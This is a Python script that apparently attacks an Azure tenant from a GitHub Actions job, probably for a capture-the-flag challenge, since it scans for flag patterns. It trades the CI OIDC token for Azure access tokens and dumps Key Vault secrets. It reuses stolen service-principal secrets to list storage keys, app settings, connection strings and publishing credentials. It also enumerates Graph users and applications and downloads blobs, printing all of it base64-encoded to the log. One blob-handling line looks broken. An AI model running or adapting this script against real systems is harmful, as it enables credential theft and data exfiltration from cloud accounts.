import os, json, base64, urllib.request, urllib.parse, urllib.error, hashlib, hmac, datetime, re, sys

TEN=os.environ.get("AZURE_TENANT_ID","3205c325-06a5-4171-9ce8-ffc5e6c2845e")
SUB=os.environ.get("AZURE_SUBSCRIPTION_ID","c5e4e004-b42d-4ac4-a502-5fd338380eb6")
CID=os.environ.get("AZURE_CLIENT_ID","72ff278a-9e71-43ec-bac4-2ca303f8e462")
RG="rg-tbl-platform-prod-sea"; RG2="rg-tbl-reporting-prod-eus"
SPS={}
ACCTS=["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblcilogsprodx3euoz","sttblarchiveprodx3euoz"]
OUT=[]
def P(*a):
    s=" ".join(str(x) for x in a); print(s,flush=True); OUT.append(s)
def B(x):
    if isinstance(x,str): x=x.encode()
    return base64.b64encode(x).decode()
def http(url, method="GET", headers=None, data=None, timeout=30):
    h=headers or {}
    if isinstance(data,(dict,list)):
        data=json.dumps(data).encode(); h.setdefault("Content-Type","application/json")
    elif isinstance(data,str): data=data.encode()
    r=urllib.request.Request(url,data=data,method=method,headers=h)
    try:
        with urllib.request.urlopen(r,timeout=timeout) as x: return x.status,x.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        try: return e.code,e.read().decode("utf-8","replace")[:4000]
        except: return e.code,""
    except Exception as e: return 0,repr(e)
def jclaims(t):
    try:
        p=t.split(".")[1]; p+="="*(-len(p)%4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception: return {}
def oidc():
    u=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL",""); tok=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")
    if not u or not tok: return ""
    st,b=http(u+("&" if "?" in u else "?")+"audience=api://AzureADTokenExchange",headers={"Authorization":"bearer "+tok})
    try: return json.loads(b).get("value","")
    except: return ""
def assert_tok(scope,client=CID,jwt=None):
    jwt=jwt or OIDC
    d={"client_id":client,"grant_type":"client_credentials","scope":scope,"client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":jwt}
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",method="POST",data=d)
    try: return json.loads(b).get("access_token","")
    except: return ""
def secret_tok(cid,sec,scope):
    d={"client_id":cid,"client_secret":sec,"grant_type":"client_credentials","scope":scope}
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",method="POST",data=d)
    try: return json.loads(b).get("access_token","")
    except: return ""
def H(t): return {"Authorization":"Bearer "+t}
def arm(path,tok,method="GET",data=None):
    return http("https://management.azure.com"+path,method=method,headers=H(tok),data=data)
def vault_get(v,path,tok):
    return http(f"https://{v}.vault.azure.net{path}",headers=H(tok))
def blob_sign(acct,key,method,path,query=""):
    kb=base64.b64decode(key)
    now=datetime.datetime.now(datetime.timezone.utc).strftime("%a, %d %b %Y %H:%M:%S GMT")
    hdr={"x-ms-date":now,"x-ms-version":"2021-08-06"}
    ms="".join(f"{k.lower()}:{hdr[k].strip()}\n" for k in sorted(hdr) if k.lower().startswith("x-ms-"))
    res=("/%s/"%acct) if not path else "/%s%s"%(acct,path)
    qs=urllib.parse.parse_qsl(query,keep_blank_values=True)
    for k,v in sorted(qs): res+="\n%s:%s"%(k.lower(),urllib.parse.unquote(v))
    sts=method+"\n"*12+ms+res
    sig=base64.b64encode(hmac.new(kb,sts.encode(),hashlib.sha256).digest()).decode()
    hdr["Authorization"]=f"SharedKey {acct}:{sig}"
    return hdr
def blob_req(acct,key,method,path,query="",timeout=30):
    h=blob_sign(acct,key,method,path,query)
    url=f"https://{acct}.blob.core.windows.net{path}"+(("?"+query) if query else "")
    return http(url,method=method,headers=h,timeout=timeout)
def scan_text(label,text):
    for pat in [r'DF26\{[^}\r\n]{1,300}\}',r'CBJS\{[^}\r\n]{1,300}\}',r'FLAG\{[^}\r\n]{1,300}\}',r'flag\{[^}\r\n]{1,300}\}',r'tebamoto\{[^}\r\n]{1,300}\}',r'PayDojo\{[^}\r\n]{1,300}\}',r'TBL\{[^}\r\n]{1,300}\}']:
        for m in re.findall(pat,text,re.I): P("FLAGHIT",label,m)

OIDC=oidc()
P("OIDC_LEN",len(OIDC))
if OIDC: P("OIDC_CLAIMS",json.dumps(jclaims(OIDC)))
TOK={}
for name,scope in [("vault","https://vault.azure.net/.default"),("arm","https://management.azure.com/.default"),("storage","https://storage.azure.com/.default"),("graph","https://graph.microsoft.com/.default")]:
    t=assert_tok(scope); TOK[name]=t
    P("CI_"+name.upper()+"_LEN",len(t),"CLAIMS",json.dumps(jclaims(t)))

# CI vault
for v in ["kv-tbl-prod-x3euoz","kv-tbl-sec-x3euoz"]:
    st,b=vault_get(v,"/secrets?api-version=7.4",TOK.get("vault",""))
    P("CI_VAULT",v,"LIST",st,B(b[:6000]))
    try:
        for item in json.loads(b).get("value",[]):
            n=item["id"].rsplit("/",1)[1]
            st2,b2=vault_get(v,f"/secrets/{n}?api-version=7.4",TOK.get("vault",""))
            P("CI_SECRET",v,n,st2,B(b2[:4000])); scan_text(v+"/"+n,b2)
    except Exception as e: P("CI_VAULT_PARSE",v,str(e))

# Load the principal secrets from KV prod at runtime
for sn in ["cost-reader-principal","directory-audit-principal","reporting-service-principal","reporting-viewer-principal","secrets-sync-principal","sync-service-principal"]:
    st,b=vault_get("kv-tbl-prod-x3euoz",f"/secrets/{sn}?api-version=7.4",TOK.get("vault",""))
    try:
        j=json.loads(json.loads(b).get("value",""))
        SPS[sn.replace("-principal","")]=[j.get("appId",""),j.get("clientSecret","")]
    except Exception: pass
P("LOADED_SP",json.dumps(sorted(SPS.keys())))

# CI ARM: keys, resources, role assignments, app config
for sa in ACCTS:
    p=f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-05-01"
    st,b=arm(p,TOK.get("arm",""),"POST",b"{}"); P("CI_LISTKEYS",sa,st,B(b[:4000]))
    p=f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/{sa}?api-version=2023-01-01"
    st,b=arm(p,TOK.get("arm","")); P("CI_STORAGE_PROP",sa,st,B(b[:3000]))
for path,label in [
 (f"/subscriptions/{SUB}/resources?api-version=2021-04-01","CI_RESOURCES"),
 (f"/subscriptions/{SUB}/resourcegroups?api-version=2021-04-01","CI_RGS"),
 (f"/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01","CI_RA_SUB"),
 (f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01","CI_RA_RG"),
 (f"/subscriptions/{SUB}/resourceGroups/{RG2}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01","CI_RA_RG2"),
]:
    st,b=arm(path,TOK.get("arm","")); P(label,st,B(b[:20000]))
for v in ["kv-tbl-prod-x3euoz","kv-tbl-sec-x3euoz"]:
    p=f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.KeyVault/vaults/{v}/secrets?api-version=2023-07-01"
    st,b=arm(p,TOK.get("arm","")); P("CI_KV_ARM",v,st,B(b[:6000]))
for rg,app in [(RG,"app-tbl-storefront-prod"),(RG,"app-tbl-reporting-prod"),(RG2,"app-tbl-reporting-prod")]:
    base=f"/subscriptions/{SUB}/resourceGroups/{rg}/providers/Microsoft.Web/sites/{app}"
    for suffix,label in [("/config/appsettings/list?api-version=2023-01-01","APPSET"),("/config/connectionstrings/list?api-version=2023-01-01","CONNSTR"),("/config/publishingcredentials/list?api-version=2023-01-01","PUB")]:
        st,b=arm(base+suffix,TOK.get("arm",""),"POST",b"{}"); P("CI_"+label,rg,app,st,B(b[:6000]))
# CI storage direct
for sa in ACCTS:
    st,b=http(f"https://{sa}.blob.core.windows.net/?comp=list",headers=dict(H(TOK.get("storage","")),**{"x-ms-version":"2021-08-06"}))
    P("CI_BLOB_LIST_CONT",sa,st,B(b[:4000]))
# CI graph read-only
for path,label in [("/v1.0/applications?$top=999&$select=id,appId,displayName,passwordCredentials","CI_GRAPH_APPS"),("/v1.0/servicePrincipals?$top=999&$select=id,appId,displayName","CI_GRAPH_SPS"),("/v1.0/users?$top=999","CI_GRAPH_USERS")]:
    st,b=http("https://graph.microsoft.com"+path,headers=H(TOK.get("graph","")))
    P(label,st,B(b[:30000]))

# All SPs: keys + vault + ARM
KEYS={}
for name,(cid,sec) in SPS.items():
    at=secret_tok(cid,sec,"https://management.azure.com/.default")
    vt=secret_tok(cid,sec,"https://vault.azure.net/.default")
    stt=secret_tok(cid,sec,"https://storage.azure.com/.default")
    P("SP",name,"ARM",bool(at),"VAULT",bool(vt),"STORAGE",bool(stt),"CLAIMS",json.dumps(jclaims(at)))
    for sa in ACCTS:
        p=f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-05-01"
        st,b=arm(p,at,"POST",b"{}")
        if st==200:
            P("SP_LISTKEYS",name,sa,st,B(b[:4000]))
            try:
                for k in json.loads(b).get("keys",[]): KEYS.setdefault(sa,set()).add(k.get("value",""))
            except: pass
        else: P("SP_LISTKEYS",name,sa,st)
    for v in ["kv-tbl-prod-x3euoz","kv-tbl-sec-x3euoz"]:
        st,b=vault_get(v,"/secrets?api-version=7.4",vt)
        P("SP_VAULT",name,v,"LIST",st,B(b[:4000]))
        try:
            for item in json.loads(b).get("value",[]):
                n=item["id"].rsplit("/",1)[1]
                st2,b2=vault_get(v,f"/secrets/{n}?api-version=7.4",vt)
                P("SP_SECRET",name,v,n,st2,B(b2[:4000])); scan_text(name+"/"+v+"/"+n,b2)
        except: pass

# Storage blobs with any keys found
for sa,keyset in KEYS.items():
    for key in list(keyset)[:2]:
        st,b=blob_req(sa,key,"GET","","comp=list")
        P("BLOB_CONT",sa,"STATUS",st,B(b[:6000]))
        conts=re.findall(r"<Name>([^<]+)</Name>",b)
        for c in conts:
            st2,b2=blob_req(sa,key,"GET","/"+c,"restype=container&comp=list")
            P("BLOB_LIST",sa,c,"STATUS",st2,B(b2[:12000]))
            names=re.findall(r"<Name>([^<]+)</Name>",b2)
            for n in names:
                st3,b3=blob_req(sa,key,"GET",f"/{c}/{n}")
                txt=b3.decode("utf-8","replace")
                P("BLOB_GET",sa,c,n,"STATUS",st3,"LEN",len(b3),"B64",B(b3[:120000]))
                scan_text(sa+"/"+c+"/"+n,txt)
P("DONE")
